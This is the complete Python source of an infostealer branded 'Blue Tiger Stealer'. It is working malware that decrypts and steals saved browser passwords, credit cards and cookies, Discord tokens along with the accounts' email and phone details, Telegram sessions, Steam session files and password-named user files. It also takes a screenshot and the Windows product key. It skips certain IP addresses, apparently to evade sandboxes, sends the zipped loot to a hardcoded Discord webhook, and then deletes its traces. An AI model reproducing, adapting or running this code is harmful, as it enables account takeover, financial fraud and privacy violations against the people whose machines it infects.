import importlib.util
import subprocess
import sys
import os
from os import getenv, listdir

def install(package):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet'])

required_modules = ['requests', 'pycryptodome', 'pywin32', 'psutil', 'pyautogui', 'pillow', 'aiohttp']

for module in required_modules:
    try:
        importlib.util.find_spec(module)
    except ImportError:
        install(module)

from json import loads, dumps
import aiohttp
import pyautogui
import asyncio
import base64
import shutil
import sqlite3
import psutil
import platform
import tempfile
from base64 import b64decode
import requests
from re import findall
from datetime import datetime, timedelta
from tempfile import TemporaryDirectory
from random import choices
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import platform
import psutil
import socket
import time

WEBHOOK_URL = "https://discord.com/api/webhooks/1330695714354761901/eIwgjFHU85Kk339vUoDxq5-mYl9KkG80ar2IavldXoEIo8Yd9Ox3cD4L6bbUBmjsHtak"
dev_mode = False

def get_hwid():
    return str(platform.node())

def get_product_key():
    result = subprocess.run(["wmic", "path", "SoftwareLicensingService", "get", "OA3xOriginalProductKey"], stdout=subprocess.PIPE, text=True)
    
    output = result.stdout.splitlines()
    
    return output[2]

def get_username():
    return os.getlogin()

def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        return response.json()
    except requests.RequestException:
        return None

blacklisted_ips = ["20.99.160.173", "104.198.96.59", "34.17.49.70", "88.67.128.44"]

ip_info = get_ip_info()

if ip_info['ip'] in blacklisted_ips:
    exit('Blacklisted ip detected...')

def get_system_uptime():
    uptime_seconds = time.time() - psutil.boot_time()
    return time.strftime("%H:%M:%S", time.gmtime(uptime_seconds))

def get_hostname():
    return socket.gethostname()

def get_processor_info():
    cpu_info = {}
    cpu_info['model'] = platform.processor()
    cpu_info['cores'] = psutil.cpu_count(logical=False)
    return cpu_info

def get_ram_info():
    ram_info = {}
    ram_info['total'] = round(psutil.virtual_memory().total / (1024 ** 3), 2)
    return ram_info

def get_disk_info():
    disk_info = {}
    disk_usage = psutil.disk_usage('/')
    disk_info['total'] = round(disk_usage.total / (1024 ** 3), 2)
    disk_info['free'] = round(disk_usage.free / (1024 ** 3), 2)
    return disk_info

def get_last_boot_time():
    boot_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(psutil.boot_time()))
    return boot_time

def gather_system_info():
    log_message(f"Gathering all the computer infos...", log_txt_path)
    username = get_username()
    hwid = get_hwid()
    ip_info = get_ip_info()
    ip_info['ip']
    os_info = {
        'name': platform.system(),
        'version': platform.version(),
        'architecture': platform.architecture()[0]
    }
    processor_info = get_processor_info()
    ram_info = get_ram_info()
    disk_info = get_disk_info()
    last_boot_time = get_last_boot_time()

    content = (
        f"PC Name: {username}\n"
        f"HWID: {hwid}\n"
        f"IP: {ip_info['ip'] if ip_info else 'N/A'}\n"
        f"Location: {ip_info['country'] if ip_info else 'N/A'}, {ip_info['city'] if ip_info else 'N/A'}\n"
        f"Timezone: {ip_info['timezone'] if ip_info else 'N/A'}\n"
        f"Operating System: {os_info['name']} {os_info['version']} ({os_info['architecture']})\n"
        f"System Uptime: {get_system_uptime()}\n"
        f"Hostname: {get_hostname()}\n"
        f"ISP: {ip_info['org'] if ip_info else 'N/A'}\n"
        f"Processor: {processor_info['model']}, {processor_info['cores']} Cores\n"
        f"RAM: {ram_info['total']} GB\n"
        f"Disk Space: {disk_info['total']} GB (Free: {disk_info['free']} GB)\n"
        f"Last Boot Time: {last_boot_time}\n"
    )
    log_message(f"Gathered all the computer infos...", log_txt_path)

    return content

file_name = f"Blue Tiger - {str(get_ip_info()['ip']).replace(".", "_")}"

def log_message(message, path=None):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if path:
        with open(path, "a") as log_file:
            log_file.write(f"[{timestamp}] - {message}\n")

def create_folder(path):
    try:
        os.makedirs(path, exist_ok=True)
        return True
    except Exception as e:
        log_message(f"Failed to create folder at {path}: {e}", log_txt_path)
        return False

if not dev_mode:
    temp_folder_path = os.path.join(tempfile.gettempdir(), file_name)
    log_txt_path = os.path.join(temp_folder_path, "log.txt")
    
    if create_folder(temp_folder_path):
        log_message(f"Created {temp_folder_path}", log_txt_path)

    filegrabber_folder = os.path.join(temp_folder_path, "FileGrabber")
    if create_folder(filegrabber_folder):
        log_message(f"Created {filegrabber_folder}", log_txt_path)

    app_folder = os.path.join(temp_folder_path, "Applications")
    if create_folder(app_folder):
        log_message(f"Created {app_folder}", log_txt_path)

    browsers_folder = os.path.join(app_folder, "Internet Browsers")
    if create_folder(browsers_folder):
        log_message(f"Created {browsers_folder}", log_txt_path)

    dsc_folder = os.path.join(app_folder, "Discord")
    if create_folder(dsc_folder):
        log_message(f"Created {dsc_folder}", log_txt_path)

    tg_folder = os.path.join(app_folder, "Telegram")
    if create_folder(tg_folder):
        log_message(f"Created {tg_folder}", log_txt_path)

    tokens_file_path = os.path.join(dsc_folder, "Tokens.txt")
    try:
        with open(tokens_file_path, 'w') as tokens_file:
            tokens_file.truncate(0)
        log_message(f"Created {tokens_file_path}", log_txt_path)
    except Exception as e:
        log_message(f"Failed to create Tokens.txt: {e}", log_txt_path)

    PC_Info_file_path = os.path.join(temp_folder_path, "PCInfos.txt")
    try:
        with open(PC_Info_file_path, 'w') as PC_Info_file:
            PC_Info_file.truncate(0)
        log_message(f"Created {PC_Info_file_path}", log_txt_path)
    except Exception as e:
        log_message(f"Failed to create PCInfos.txt: {e}", log_txt_path)

    screenshot_file_path = os.path.join(temp_folder_path, "screenshot.png")
    try:
        screenshot = pyautogui.screenshot()
        screenshot = screenshot.convert("RGB")
        screenshot.save(screenshot_file_path, format="JPEG", quality=85)
        log_message(f"Created {screenshot_file_path}", log_txt_path)
    except Exception as e:
        log_message(f"Failed to create screenshot file: {e}", log_txt_path)

else:
    current_folder_path = os.path.join(os.getcwd(), file_name)
    log_txt_path = os.path.join(current_folder_path, "log.txt")

    if create_folder(current_folder_path):
        log_message(f"Created {current_folder_path}", log_txt_path)

    filegrabber_folder = os.path.join(current_folder_path, "FileGrabber")
    if create_folder(filegrabber_folder):
        log_message(f"Created {filegrabber_folder}", log_txt_path)

    app_folder = os.path.join(current_folder_path, "Applications")
    if create_folder(app_folder):
        log_message(f"Created {app_folder}", log_txt_path)

    browsers_folder = os.path.join(app_folder, "Internet Browsers")
    if create_folder(browsers_folder):
        log_message(f"Created {browsers_folder}", log_txt_path)

    dsc_folder = os.path.join(app_folder, "Discord")
    if create_folder(dsc_folder):
        log_message(f"Created {dsc_folder}", log_txt_path)

    tg_folder = os.path.join(app_folder, "Telegram")
    if create_folder(tg_folder):
        log_message(f"Created {tg_folder}", log_txt_path)

    tokens_file_path = os.path.join(dsc_folder, "Tokens.txt")
    try:
        with open(tokens_file_path, 'w') as tokens_file:
            tokens_file.truncate(0)
        log_message(f"Created {tokens_file_path}", log_txt_path)
    except Exception as e:
        log_message(f"Failed to create Tokens.txt: {e}", log_txt_path)

    PC_Info_file_path = os.path.join(current_folder_path, "PCInfos.txt")
    try:
        with open(PC_Info_file_path, 'w') as PC_Info_file:
            PC_Info_file.truncate(0)
        log_message(f"Created {PC_Info_file_path}", log_txt_path)
    except Exception as e:
        log_message(f"Failed to create PCInfos.txt: {e}", log_txt_path)

    screenshot_file_path = os.path.join(current_folder_path, "screenshot.png")

    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_file_path)
        log_message(f"Created {screenshot_file_path}", log_txt_path)
    except Exception as e:
        log_message(f"Failed to create screenshot file: {e}", log_txt_path)

def grab_password_files():
    filesss = ["pdw", "password", "motdepasse", "mdp", "motsdepasse", "motdepasses", "prout", "alt", "alts", "mfa", "mfas"]
    resp = requests.get('https://ipinfo.io/json').json()['ip']

    with tempfile.TemporaryDirectory(prefix=f"BlueTigger_{resp.replace('.', '_')}", delete=True) as temp_folder:

        user = fr"C:\Users\{os.getlogin()}"
        paths = [os.path.join(user, "Desktop"), os.path.join(user, "Documents"), os.path.join(user, "Downloads")]

        def check_files(path, file_type):
            log_message(f"Checking {path} for {file_type}...", log_txt_path)
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if os.path.isfile(file_path) and not (file.endswith('.jar') or file.endswith('.lnk') or file.endswith('.json') or file.endswith('.png') or file.endswith('.link') or file.endswith('.class') or file.endswith('.java')):
                        if any(word in file.lower() for word in filesss):
                            log_message(f"Detected file: {file} | path: {file_path}", log_txt_path)
                            shutil.copy2(file_path, filegrabber_folder)

        for path in paths:
            check_files(path, 'passwords')
            check_files(path, 'nudes')


        try:
            archive_path = shutil.make_archive(temp_folder, 'zip', temp_folder)
            
            zipped_file_path = f"{archive_path}.zip"
            shutil.move(zipped_file_path, os.path.join(filegrabber_folder, f"{os.path.basename(temp_folder)}.zip"))
            log_message(f"Created ZIP archive at {filegrabber_folder}", log_txt_path)
            
        except Exception as exc:
            log_message(f"Failed to create or move zip archive: {exc}", log_txt_path)

def get_hwid():
    result = subprocess.run(["wmic", "csproduct", "get", "uuid"], capture_output=True, text=True)
    return result.stdout.splitlines()[2]

def dc_log():
    def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except Exception as e:
            return None

    def get_tokens():
        log_message(f"Retrieving the discord token...", log_txt_path)
        tokens = []
        cleaned = []
        paths = {
            'Discord': getenv('APPDATA') + '\\discord\\Local Storage\\leveldb',
            'Discord Canary': getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
            'Discord PTB': getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb',
            'Lightcord': getenv('APPDATA') + '\\Lightcord\\Local Storage\\leveldb',
        }
        
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            try:
                with open(getenv('APPDATA') + f'\\{platform}\\Local State', "r") as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
                for file in listdir(path):
                    if not (file.endswith(".ldb") or file.endswith(".log")):
                        continue
                    try:
                        with open(path + f'\\{file}', "r", errors='ignore') as token_file:
                            for line in token_file.readlines():
                                line = line.strip()
                                for value in findall(r"dQw4w9WgXcQ:[^\s]+", line):
                                    tokens.append(value)
                    except PermissionError as e:
                        continue
            except Exception as e:
                continue

        for token in tokens:
            if token not in cleaned:
                try:
                    decrypted_token = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                    if decrypted_token:
                        cleaned.append(decrypted_token)
                except Exception as e:
                    continue
        log_message(f"Retrieved discord tokens...", log_txt_path)
        return set(cleaned)

    def send_webhook(content):
        payload = dumps({'content': content, 'username': '~Blue Tiger V1~', 'avatar_url': 'https://cdn.discordapp.com/attachments/1315989723621097472/1315989790927224882/astolfo_upscaled.jpg?ex=678ecf40&is=678d7dc0&hm=3f2b35d7271a59145cd8e1da96a3738b74b7f74322fb68d58c153427b08a9fd1&'})
        headers = {'Content-Type': 'application/json'}
        response = requests.post(WEBHOOK_URL, headers=headers, data=payload)
        if response.status_code != 204:
            log_message(f"Failed to send webhook: {response.status_code}", log_txt_path)

    def t():
        def get_ip():
            response = requests.get("https://ipinfo.io/json")
            data = response.json()
            ip = data.get("ip") or "Unknown"
            city = data.get("city") or "Unknown"
            region = data.get("region") or "Unknown"
            country = data.get("country") or "Unknown"
            org = data.get("org") or "Unknown"
            return f"> **IP:** `{ip}`\n> **City:** `{city}`\n> **Region:** `{region}`\n> **Country:** `{country}`\n> **Org:** `{org}`"
        tokens = get_tokens()
        if tokens:
            all_tokens = ""
            for token in tokens:
                headers = {'Authorization': token}
                response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                
                if response.status_code == 200:
                    user_info = response.json()
                    user_name = f"{user_info['username']}#{user_info['discriminator']}"
                    user_id = user_info['id']
                    email = user_info.get('email', 'No email provided')
                    phone = user_info.get('phone', 'No phone provided')
                    mfa_enabled = user_info['mfa_enabled']
                    has_nitro = False
                    days_left = 0
                    
                    nitro_response = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers)
                    if nitro_response.status_code == 200 and nitro_response.json():
                        has_nitro = True
                        nitro_data = nitro_response.json()
                        if nitro_data:
                            days_left = (datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S") - datetime.now()).days
                    
                    embed_content = f"### {user_name} ({user_id})\n:person_frowning: **Account Information**\n:envelope_with_arrow: *Email*: `{email}`\n:telephone_receiver: *Phone*: `{phone}`\n:lock: *2FA/MFA Enabled*: `{mfa_enabled}`\n:gem: *Nitro*: `{has_nitro}`\n*Expires in*: `{days_left if days_left else "None"} days`\n:rightwards_hand: *Token*: `{token}`\n*Made by @bypassfdp.java* **|** || https://discord.gg/Cw545PtvHv ||"

                    with open(tokens_file_path, "a") as f:
                        f.write(token + "\n")

                    log_message(f"Sending webhook of the token info...", log_txt_path)
                    send_webhook(embed_content)
                    log_message(f"Sent webhook of the token info...", log_txt_path)

    t()

TELEGRAM_PATH = os.path.join(os.getenv("APPDATA"), "Telegram Desktop")
TEMP_PATH = os.getenv("TEMP")

def random_string(len):
    return ''.join(choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=len))

def tg_log():
    if not os.path.exists(TELEGRAM_PATH):
        return
    
    tdata_folder = os.path.join(TELEGRAM_PATH, "tdata")

    with TemporaryDirectory() as temp:
        shutil.copytree(
            tdata_folder, temp, dirs_exist_ok=True,
            ignore=shutil.ignore_patterns("working", "user_data", "user_data#2", "emoji", "dumps", "tdummy", "temp")
        )

        archive_dir = os.path.join(TEMP_PATH, random_string(6))
        shutil.make_archive(archive_dir, "zip", temp)

        shutil.move(archive_dir + ".zip", tg_folder)


appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = CryptUnprotectData(key[5:], None, None, None, 0)[1]
    return key

async def fetch(session, url):
    async with session.get(url) as response:
        return await response.json()

async def GetSteamSession() -> None:
    try:
        all_disks = []
        for drive in range(ord('A'), ord('Z') + 1):
            drive_letter = chr(drive)
            if os.path.exists(drive_letter + ':\\'):
                all_disks.append(drive_letter)
                
        for steam_path in all_disks:
            steam_path = os.path.join(steam_path + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
            if os.path.isfile(steam_path):
                with open(steam_path, "r", encoding="utf-8", errors="ignore") as file:
                    steamid = "".join(findall(r"7656[0-9]{13}", file.read()))
                    if steamid:
                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                            url1 = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=YOUR_API_KEY&steamids={steamid}"
                            url2 = f"https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=YOUR_API_KEY&steamid={steamid}"
                            
                            response = await fetch(session, url1)
                            response2 = await fetch(session, url2)
                            
                            player_data = response["response"]["players"][0]
                            personname = player_data["personaname"]
                            profileurl = player_data["profileurl"]
                            avatar = player_data["avatarfull"]
                            timecreated = player_data["timecreated"]
                            realname = player_data.get("realname", "None")
                            player_level = response2["response"]["player_level"]
                            
                            embed_data =f"""***Blue Tiger Stealer***\n
                                        ***Steam Session Detected***\n
                                        **thumbnail**: {avatar}\n
                                        **Username**: f'``{personname}``\n
                                        **Realname**: ``{realname}``\n
                                        **ID**: ``{steamid}``\n
                                        **Timecreated**: f"``{timecreated}``\n
                                        **Player Level**: ``{player_level}``\n
                                        **Profile URL**: ``{profileurl}``"""
                            
                            payload = {
                                "username": "Blue Tiger Stealer",
                                "content": embed_data
                            }
                            headers = {"Content-Type": "application/json"}
                            try:
                                resp = requests.post(WEBHOOK_URL, data=payload, headers=headers)
                                print(resp.json())
                            except Exception as e:
                                print(resp.json())
                                print(e)
    except Exception as e:
        log_message(f"An error occurred during the extraction of the steam session: {e}", log_txt_path)

def StealSteamSessionFiles() -> None:
    try:
        save_path = temp_folder_path
        steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
        if os.path.isdir(steam_path):
            to_path = os.path.join(save_path, "Games", "Steam")
            if not os.path.isdir(to_path):
                os.mkdir(to_path)
            shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
            with open(os.path.join(to_path, "How to Use.txt"), "w", errors="ignore", encoding="utf-8") as file:
                file.write("https://t.me/ExelaStealer\n===========================================\nFirst close your steam and open this folder on your Computer, <C:\\Program Files (x86)\\Steam\\config>\nSecond Replace all this files with stolen Files\nFinally you can start steam.\n")
    except:
        return "null"

def decrypt_password(buff: bytes, key: bytes) -> str:
    cipher = AES.new(key, AES.MODE_GCM, buff[3:15])
    decrypted_pass = cipher.decrypt(buff[15:])
    decrypted_pass = decrypted_pass[:-16]
    try:
        decrypted_pass = decrypted_pass.decode('utf-8')
    except UnicodeDecodeError:
        decrypted_pass = ' '.join(f'{b:02x}' for b in decrypted_pass)
    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    log_message(f"Saving the results of the cookies for {browser_name}...", log_txt_path)
    temp_file_path = os.path.join(tempfile.gettempdir(), f'{browser_name}_{type_of_data}.txt')
    if content and content.strip():
        with open(temp_file_path, 'w', encoding='utf-8') as temp_file:
            temp_file.write(content)
    log_message(f"Saved the results of the cookies for {browser_name}...", log_txt_path)
    return temp_file_path

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return ""

    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
    except Exception as e:
        return result
        
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    rows = cursor.fetchall()

    if not rows:
        return result

    for row in rows:
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes) and row[i]:
                    row[i] = decrypt_password(row[i], key)

        if all(not val for val in row):
            continue

        if type_of_data['columns'] == ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On']:
            result += f"{row[0]} | {row[1]} | {row[3]} | {convert_chrome_time(row[4])}\n"
        else:
            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"

    conn.close()
    os.remove('temp_db')
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    log_message(f"Checking installed browsers...", log_txt_path)
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x] + "\\Local State"):
            available.append(x)
    log_message(f"Checked installed browsers...", log_txt_path)
    return available

def send_to_webhook(filepath: str, webhook_url: str):
    with open(filepath, 'rb') as f:
        files = {'file': f}
        
        payload = {
            'username': 'Blue Tiger Stealer',
            'avatar_url': 'https://cdn.discordapp.com/attachments/1315989723621097472/1315989790927224882/astolfo_upscaled.jpg?ex=678ecf40&is=678d7dc0&hm=3f2b35d7271a59145cd8e1da96a3738b74b7f74322fb68d58c153427b08a9fd1&'
        }

        response = requests.post(webhook_url, data=payload, files=files)
        return response

def ckie_stlr():
    available_browsers = installed_browsers()
    all_temp_files = []

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            profile = "Default"
            if browser == 'opera-gx':
                profile = ""
                
            data = get_data(browser_path, profile, master_key, data_type)
            if data:
                temp_file_path = save_results(browser, data_type_name, data)
                all_temp_files.append(temp_file_path)

    if not all_temp_files:
        pass
    else:
        combined_file_path = os.path.join(tempfile.gettempdir(), "combined_data.txt")
        with open(combined_file_path, 'w', encoding="utf-8") as combined_file:
            for temp_file in all_temp_files:
                with open(temp_file, 'r', encoding="utf-8") as f:
                    combined_file.write(f"--- {os.path.basename(temp_file)} ---\n")
                    combined_file.write(f.read() + "\n\n")

        shutil.move(combined_file_path, os.path.join(browsers_folder, "Browser Data.txt"))
        time.sleep(0.5)
        try:
            log_message("Removing traces...", log_txt_path)
            for temp_file in all_temp_files:
                os.remove(temp_file)
                time.sleep(0.5)
            os.remove(combined_file_path)
            log_message("Removed traces...", log_txt_path)
        except Exception as e:
            log_message(f"An error occured whilst cleaning the traces: {e}", log_txt_path)

def auto_destroy(file_name):
    attempts = 3
    for attempt in range(attempts):
        try:
            os.remove(os.path.join(os.getcwd(), file_name))
            break
        except PermissionError as e:
            log_message(f"Attempt {attempt + 1}: Permission denied. Retrying...", log_txt_path)
            time.sleep(1)
    else:
        log_message(f"Failed to remove {file_name} after {attempts} attempts.", log_txt_path)

def remove_zip_and_folder(file_name):
    zip_file_path = os.path.join(os.getcwd() if dev_mode else tempfile.gettempdir(), file_name + ".zip")
    auto_destroy(zip_file_path)
    
    try:
        shutil.rmtree(os.path.join(os.getcwd() if dev_mode else tempfile.gettempdir(), file_name))
    except Exception as e:
        log_message(f"Error removing directory {file_name}: {e}", log_txt_path)


async def main():
    fez = gather_system_info()
    with open(PC_Info_file_path, 'w+') as f:
        f.write(fez + f"\n\nProduct Key: {get_product_key()}")

    await GetSteamSession()
    dc_log()
    tg_log()
    ckie_stlr()
    grab_password_files()
    
    payload = {
        'username': 'Token Grabber',
        'avatar_url': 'https://cdn.discordapp.com/attachments/1315989723621097472/1315989790927224882/astolfo_upscaled.jpg?ex=678ecf40&is=678d7dc0&hm=3f2b35d7271a59145cd8e1da96a3738b74b7f74322fb68d58c153427b08a9fd1&',
        'content': '@everyone'
    }
    
    file_path = temp_folder_path if not dev_mode else current_folder_path
    
    archive_name = os.path.join(tempfile.gettempdir(), file_name)
    shutil.make_archive(archive_name, "zip", file_path)

    zip_file_path = f"{archive_name}.zip"
    with open(zip_file_path, 'rb') as f:
        files = {'file': f}
        requests.post(WEBHOOK_URL, data=payload, files=files)
        
    remove_zip_and_folder(file_name)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        print(e)
